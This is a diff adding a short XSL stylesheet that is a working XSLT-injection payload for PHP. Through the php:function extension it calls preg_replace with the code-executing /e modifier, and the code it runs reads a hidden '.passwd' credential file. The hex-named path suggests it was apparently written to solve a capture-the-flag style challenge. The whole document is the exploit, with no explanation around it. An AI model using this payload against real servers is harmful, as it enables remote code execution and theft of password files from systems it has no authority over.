@@ -1,0 +1,8 @@
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
+        <xsl:template match="/">
+                 <xsl:variable name="eval">
+                         eval(print_r(file_get_contents('.6ff3200bee785801f420fba826ffcdee/.passwd')))
+                   </xsl:variable>
+                   <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
+          </xsl:template>
+   </xsl:stylesheet>
